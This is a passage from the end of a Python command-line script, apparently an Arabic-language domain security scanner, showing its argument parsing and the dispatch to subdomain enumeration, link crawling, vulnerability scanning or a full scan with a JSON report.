            print("\n\n⚠️ تم إيقاف الفحص من قبل المستخدم")
            self.generate_report(output_file)
        except Exception as e:
            print(f"\n❌ حدث خطأ أثناء الفحص: {str(e)}")
            self.generate_report(output_file)

def main():
    parser = argparse.ArgumentParser(description='أداة فحص أمنية شاملة للدومينات - المبرمج: SaudiLinux - البريد: SaudiLinux1@gmail.com')
    parser.add_argument('domain', help='الدومين المستهدف للفحص (مثال: example.com)')
    parser.add_argument('--threads', type=int, default=15, help='عدد الخيوط المتزامنة (الافتراضي: 15)')
    parser.add_argument('--timeout', type=int, default=10, help='مهلة الطلب بالثواني (الافتراضي: 10)')
    parser.add_argument('--output', '-o', help='مسار ملف حفظ التقرير بتنسيق JSON')
    parser.add_argument('--subdomains-only', action='store_true', help='استخراج النطاقات الفرعية فقط')
    parser.add_argument('--crawl-only', action='store_true', help='الزحف واستخراج الروابط فقط')
    parser.add_argument('--vuln-scan-only', action='store_true', help='فحص الثغرات فقط')
    
    args = parser.parse_args()
    
    # إنشاء كائن الماسح
    scanner = DomainSecurityScanner(args.domain, threads=args.threads, timeout=args.timeout)
    
    if args.subdomains_only:
        scanner.print_banner()
        scanner.enumerate_subdomains()
        scanner.generate_report(args.output)
    elif args.crawl_only:
        scanner.print_banner()
        scanner.crawl_and_extract_links()
        scanner.generate_report(args.output)
    elif args.vuln_scan_only:
        scanner.print_banner()
        scanner.crawl_and_extract_links()
        scanner.scan_vulnerabilities()
        scanner.generate_report(args.output)
    else:
        # تشغيل الفحص الكامل
        scanner.run_full_scan(args.output)

if __name__ == "__main__":
    main()
